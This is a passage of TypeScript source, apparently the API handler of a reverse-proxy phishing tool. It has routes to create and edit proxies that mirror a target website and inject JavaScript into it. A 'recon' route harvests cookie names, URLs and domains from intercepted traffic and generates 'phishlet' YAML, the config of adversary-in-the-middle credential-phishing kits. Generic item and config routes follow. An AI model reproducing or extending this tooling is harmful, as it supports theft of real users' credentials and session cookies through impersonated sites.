        parsed = new URL(targetUrl);
      } catch {
        return Response.json(
          { success: false, error: "a valid target URL (https://…) is required" },
          { status: 400 },
        );
      }
      if (parsed.protocol !== "http:" && parsed.protocol !== "https:") {
        return Response.json(
          { success: false, error: "target must be an http(s) URL" },
          { status: 400 },
        );
      }
      const label = name || parsed.hostname;
      const slug = this.uniqueSlug(name || parsed.hostname);
      const now = Date.now();
      safeSql(() => {
        this.ctx.storage.sql.exec(
          "INSERT INTO proxies (slug, name, target_url, enabled, hits, intercept_enabled, inject_js, inject_js_enabled, phishlet, created_at, updated_at) VALUES (?, ?, ?, 1, 0, 0, ?, 0, ?, ?, ?)",
          slug,
          label,
          parsed.toString().replace(/\/$/, ""),
          (body?.injectJs ?? "").toString(),
          (body?.phishlet ?? "").toString(),
          now,
          now,
        );
      });
      const created = safeSql(() =>
        this.ctx.storage.sql
          .exec<ProxyRow>("SELECT * FROM proxies WHERE id = last_insert_rowid()")
          .one(),
      );
      if (!created.ok || !created.value) {
        return Response.json(
          { success: false, error: "failed to create proxy" },
          { status: 500 },
        );
      }
      return withRl(
        Response.json(
          { success: true, data: this.toProxy(created.value) },
          { status: 201 },
        ),
      );
    }

    const proxyIdMatch = path.match(/^\/api\/proxies\/(\d+)$/);
    if (proxyIdMatch) {
      const id = Number(proxyIdMatch[1]);
      const existing = this.findProxy(id);
      if (!existing) {
        return Response.json(
          { success: false, error: "proxy not found" },
          { status: 404 },
        );
      }

      if (method === "PUT") {
        const body = (await this.safeJson(request)) as Partial<Proxy> | null;
        let targetUrl = existing.targetUrl;
        if (body?.targetUrl !== undefined) {
          try {
            const parsed = new URL(String(body.targetUrl).trim());
            if (parsed.protocol !== "http:" && parsed.protocol !== "https:") {
              throw new Error("bad protocol");
            }
            targetUrl = parsed.toString().replace(/\/$/, "");
          } catch {
            return Response.json(
              { success: false, error: "target must be a valid http(s) URL" },
              { status: 400 },
            );
          }
        }
        const name =
          body?.name !== undefined ? String(body.name).trim() : existing.name;
        const enabled =
          body?.enabled !== undefined ? (body.enabled ? 1 : 0) : existing.enabled ? 1 : 0;
        const interceptEnabled =
          body?.interceptEnabled !== undefined
            ? (body.interceptEnabled ? 1 : 0)
            : existing.interceptEnabled ? 1 : 0;
        const proxyDomain =
          body?.proxyDomain !== undefined
            ? String(body.proxyDomain).trim()
            : existing.proxyDomain;
        const injectJs =
          body?.injectJs !== undefined
            ? String(body.injectJs)
            : existing.injectJs;
        const injectJsEnabled =
          body?.injectJsEnabled !== undefined
            ? (body.injectJsEnabled ? 1 : 0)
            : existing.injectJsEnabled ? 1 : 0;
        const phishlet =
          body?.phishlet !== undefined
            ? String(body.phishlet)
            : existing.phishlet;
        safeSql(() => {
          this.ctx.storage.sql.exec(
            "UPDATE proxies SET name = ?, target_url = ?, enabled = ?, intercept_enabled = ?, proxy_domain = ?, inject_js = ?, inject_js_enabled = ?, phishlet = ?, updated_at = ? WHERE id = ?",
            name || existing.name,
            targetUrl,
            enabled,
            interceptEnabled,
            proxyDomain,
            injectJs,
            injectJsEnabled,
            phishlet,
            Date.now(),
            id,
          );
        });
        return withRl(Response.json({ success: true, data: this.findProxy(id) }));
      }

      if (method === "DELETE") {
        // Cascade: wipe intercept captures for this proxy too.
        this.clearInterceptsForSlug(existing.slug);
        safeSql(() => {
          this.ctx.storage.sql.exec("DELETE FROM proxies WHERE id = ?", id);
        });
        this.listCache = null;
        return withRl(Response.json({ success: true, data: existing }));
      }
    }

    const reconMatch = path.match(/^\/api\/proxies\/(\d+)\/recon$/);
    if (reconMatch) {
      const id = Number(reconMatch[1]);
      const existing = this.findProxy(id);
      if (!existing) {
        return Response.json(
          { success: false, error: "proxy not found" },
          { status: 404 },
        );
      }
      if (method === "POST") {
        const body = (await this.safeJson(request)) as {
          targetUrl?: string;
          captured?: {
            urls?: string[];
            cookies?: string[];
            formFields?: { name: string; type: string }[];
            redirects?: string[];
            domains?: string[];
          };
        } | null;
        const captured = body?.captured ?? {};
        // Merge with recent intercepts for richer reconnaissance.
        const intercepts = this.listInterceptsForSlug(existing.slug);
        const interceptedDomains = intercepts
          .map((i) => {
            try {
              return new URL(i.host).hostname;
            } catch {
              return i.host;
            }
          })
          .filter(Boolean);
        const interceptedCookies = intercepts
          .flatMap((i) => {
            const header = i.reqHeaders
              .split("\n")
              .find((line) => line.toLowerCase().startsWith("cookie:"));
            if (!header) return [];
            return header.slice(7).trim().split(";").map((c) => c.split("=")[0].trim());
          })
          .filter(Boolean);
        const interceptedUrls = intercepts.map((i) => `${i.host}${i.path}`);
        const merged: typeof captured = {
          urls: [...new Set([...(captured.urls ?? []), ...interceptedUrls])],
          cookies: [...new Set([...(captured.cookies ?? []), ...interceptedCookies])],
          formFields: captured.formFields ?? [],
          redirects: captured.redirects ?? [],
          domains: [...new Set([...(captured.domains ?? []), ...interceptedDomains])],
        };
        const phishlet = buildPhishletYaml(existing, merged);
        safeSql(() => {
          this.ctx.storage.sql.exec(
            "UPDATE proxies SET phishlet = ?, updated_at = ? WHERE id = ?",
            phishlet,
            Date.now(),
            id,
          );
        });
        return withRl(
          Response.json({
            success: true,
            data: { proxyId: id, phishlet, captured: merged },
          }),
        );
      }
    }

    if (path === "/api/items" && method === "GET") {
      const ttl = Number(request.headers.get("X-Cache-TTL") ?? "10");
      const now = Date.now();
      if (this.listCache && this.listCache.expires > now) {
        return withRl(this.jsonCached(this.listCache.body, "HIT"));
      }
      const items = this.listItems();
      const body = JSON.stringify({ success: true, data: items, count: items.length });
      this.listCache = { body, expires: now + ttl * 1000 };
      return withRl(this.jsonCached(body, "MISS"));
    }

    if (path === "/api/items" && method === "POST") {
      const body = (await this.safeJson(request)) as Partial<Item> | null;
      const name = (body?.name ?? "").trim();
      if (!name) {
        return Response.json(
          { success: false, error: "name is required" },
          { status: 400 },
        );
      }
      const description = (body?.description ?? "").toString();
      const now = Date.now();
      safeSql(() => {
        this.ctx.storage.sql.exec(
          "INSERT INTO items (name, description, created_at, updated_at) VALUES (?, ?, ?, ?)",
          name,
          description,
          now,
          now,
        );
      });
      this.listCache = null;
      const created = safeSql(() =>
        this.ctx.storage.sql
          .exec<ItemRow>("SELECT * FROM items WHERE id = last_insert_rowid()")
          .one(),
      );
      if (!created.ok || !created.value) {
        return Response.json(
          { success: false, error: "failed to create item" },
          { status: 500 },
        );
      }
      return withRl(
        Response.json(
          { success: true, data: this.toItem(created.value) },
          { status: 201 },
        ),
      );
    }

    const idMatch = path.match(/^\/api\/items\/(\d+)$/);
    if (idMatch) {
      const id = Number(idMatch[1]);

      if (method === "PUT") {
        const existing = this.findItem(id);
        if (!existing) {
          return Response.json(
            { success: false, error: "item not found" },
            { status: 404 },
          );
        }
        const body = (await this.safeJson(request)) as Partial<Item> | null;
        const name = body?.name !== undefined ? String(body.name).trim() : existing.name;
        if (!name) {
          return Response.json(
            { success: false, error: "name is required" },
            { status: 400 },
          );
        }
        const description =
          body?.description !== undefined
            ? String(body.description)
            : existing.description;
        const now = Date.now();
        safeSql(() => {
          this.ctx.storage.sql.exec(
            "UPDATE items SET name = ?, description = ?, updated_at = ? WHERE id = ?",
            name,
            description,
            now,
            id,
          );
        });
        this.listCache = null;
        return withRl(Response.json({ success: true, data: this.findItem(id) }));
      }

      if (method === "DELETE") {
        const existing = this.findItem(id);
        if (!existing) {
          return Response.json(
            { success: false, error: "item not found" },
            { status: 404 },
          );
        }
        safeSql(() => {
          this.ctx.storage.sql.exec("DELETE FROM items WHERE id = ?", id);
        });
        this.listCache = null;
        return withRl(Response.json({ success: true, data: existing }));
      }
    }

    // --- /api/config ---------------------------------------------------

    if (path === "/api/config" && method === "GET") {
      const result = safeSql(() => this.getConfig());
      if (!result.ok) {
        return Response.json(
          { success: false, error: result.error },
          { status: 500 },
        );
      }
      return withRl(
        Response.json({ success: true, data: result.value }),
      );
    }

    if (path === "/api/config" && method === "PUT") {
      const body = (await this.safeJson(request)) as Record<string, string> | null;
      if (!body || Object.keys(body).length === 0) {
        return Response.json(
          { success: false, error: "at least one config field is required" },
          { status: 400 },
        );
      }
      const filtered: Record<string, string> = {};
      for (const [k, v] of Object.entries(body)) {
        if ((CONFIG_FIELDS as readonly string[]).includes(k)) {
          filtered[k] = String(v);
        }
      }
      if (Object.keys(filtered).length === 0) {
        return Response.json(
          { success: false, error: "no valid config fields provided" },
          { status: 400 },
        );
      }
      const result = safeSql(() => {
        this.setConfig(filtered);
        return this.getConfig();
      });
      if (!result.ok) {
        return Response.json(
          { success: false, error: result.error },
          { status: 500 },
        );
      }
      return withRl(
        Response.json({ success: true, data: result.value }),
      );
    }

    if (path === "/api/config" && method === "DELETE") {
      const result = safeSql(() => {
        this.clearConfig();
        return this.getConfig();
      });
      if (!result.ok) {
        return Response.json(
          { success: false, error: result.error },
          { status: 500 },
        );
      }
      return withRl(
        Response.json({ success: true, data: result.value }),
      );
    }

    return Response.json({ success: false, error: "not found" }, { status: 404 });
  }

  private jsonCached(body: string, cache: "HIT" | "MISS"): Response {
    return new Response(body, {
      status: 200,
      headers: { "Content-Type": "application/json", "X-Cache": cache },
    });
  }

  private listItems(): Item[] {
    const result = safeSql(() =>
      this.ctx.storage.sql
        .exec<ItemRow>("SELECT * FROM items ORDER BY created_at DESC")
        .toArray()
        .map((row) => this.toItem(row)),
    );
    return result.ok ? result.value : [];
  }

  private findItem(id: number): Item | null {
    const result = safeSql(() => {
      const rows = this.ctx.storage.sql
        .exec<ItemRow>("SELECT * FROM items WHERE id = ?", id)
        .toArray();
      return rows.length > 0 ? this.toItem(rows[0]) : null;
    });
    return result.ok ? result.value : null;
  }

  private toItem(row: ItemRow): Item {
    return {
      id: row.id,
      name: row.name,
      description: row.description,
      createdAt: row.created_at,
      updatedAt: row.updated_at,
    };
  }

  private async safeJson(request: Request): Promise<unknown> {
    try {
      return await request.json();
    } catch {
      return null;
    }
  }
}
